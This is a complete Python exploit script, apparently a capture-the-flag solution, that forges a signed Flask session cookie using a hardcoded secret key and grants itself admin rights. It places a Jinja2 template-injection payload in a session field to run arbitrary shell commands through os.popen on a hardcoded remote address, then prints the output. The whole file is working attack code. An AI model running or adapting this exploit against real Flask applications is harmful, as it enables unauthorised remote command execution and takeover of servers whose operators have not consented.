import hashlib
import sys
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import requests

REMOTE = "http://13.58.101.77:8888/lain"
shell_cmd = "id"

if len(sys.argv) == 2:
    shell_cmd = sys.argv[1]

app = Flask(__name__)
app.secret_key = "30f5e5b5289165a10211f4443d5e8fb666f8cdc2fe8d69a574d2e8c60bed7f9e"

s = app.session_interface.get_signing_serializer(app)
token = s.dumps({
    "_permanent": True,
    "uuid": "{{{{request.application.__globals__.__builtins__.__import__('os').popen('{} 2>&1').read()}}}}".format(shell_cmd),
    "is_admin": True
})

cookies = {
    "session": token
}

r = requests.get(REMOTE, cookies=cookies)
print(r.text.split(">>> welcome, ")[1].split("\n.\n")[0])
